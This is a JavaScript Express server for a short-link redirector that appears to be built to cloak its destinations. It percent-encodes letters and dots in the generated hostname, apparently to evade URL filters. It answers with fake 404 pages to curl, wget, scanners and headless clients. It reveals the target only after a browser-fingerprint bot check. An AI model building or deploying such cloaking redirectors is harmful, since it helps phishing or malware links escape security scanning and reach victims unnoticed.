require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const path = require('path');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'interest-cohort=()');
  res.setHeader('Cache-Control', 'no-store');
  next();
});

function generateShortKey() {
  return crypto.randomBytes(4).toString('base64url');
}

/* --------------------------------
   CREATE SHORT LINK
--------------------------------- */
app.post('/add-redirect', async (req, res) => {
  const { destination } = req.body;

  if (!destination || !/^https?:\/\//i.test(destination)) {
    return res.status(400).json({ message: 'Invalid destination URL.' });
  }

  const key = generateShortKey();
  await db.addRedirect(key, destination);

  const protocol = req.protocol + '://';
  const host = req.get('host');

  const encodedHost = host
    .replace(/\./g, '%2E')
    .replace(/o/g, '%6F')
    .replace(/c/g, '%63')
    .replace(/m/g, '%6D');

  const encodedUrl = `${protocol}${encodedHost}/${key}`;

  res.json({ redirectUrl: encodedUrl });
});

/* --------------------------------
   STEP 1: CHALLENGE PAGE
--------------------------------- */
app.get('/:key', async (req, res) => {
  const key = req.params.key;

  // Ignore static files like me.html, favicon.ico, etc
  if (key.includes('.') || key.length < 4) {
    return res.status(404).send('Not found');
  }

  const ua = req.headers['user-agent'] || '';

  if (/curl|wget|python|okhttp|scrapy|scanner|postman|headless/i.test(ua)) {
    return res.status(404).send('Not found');
  }

  const row = await db.getRedirect(key);
  if (!row) return res.status(404).send('Not found');

  // IMPORTANT: pass key into challenge page
  res.redirect('/challenge.html?rid=' + encodeURIComponent(key));
});

/* --------------------------------
   STEP 2: VERIFY
--------------------------------- */
app.post('/verify', async (req, res) => {
  const d = req.body;
  let score = 0;

// HARD bot signals
if (d.honeypot) score += 100;
if (d.webdriver) score += 80;
if (d.headless) score += 80;

// SOFT signals
if (!d.mouseMoves || d.mouseMoves < 2) score += 10;
if (!d.hadFocus) score += 10;
if (!d.plugins || d.plugins === 0) score += 10;
if (!d.languages || d.languages === 0) score += 10;

// Block only if clearly a bot
if (score >= 80) {
  return res.status(403).json({ ok: false });
}

  const token = jwt.sign(
    {
      rid: d.rid,
      exp: Math.floor(Date.now() / 1000) + 60
    },
    process.env.JWT_SECRET
  );

  res.json({ ok: true, token });
});

/* --------------------------------
   STEP 3: FINAL REDIRECT
--------------------------------- */
app.get('/go', async (req, res) => {
  try {
    const decoded = jwt.verify(req.query.token, process.env.JWT_SECRET);

    const row = await db.getRedirect(decoded.rid);
    if (!row) return res.status(404).send('Not found');

    res.redirect(302, row.destination);
  } catch (e) {
    res.status(403).send('Forbidden');
  }
});

app.use((req, res) => res.status(404).send('Not found'));

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
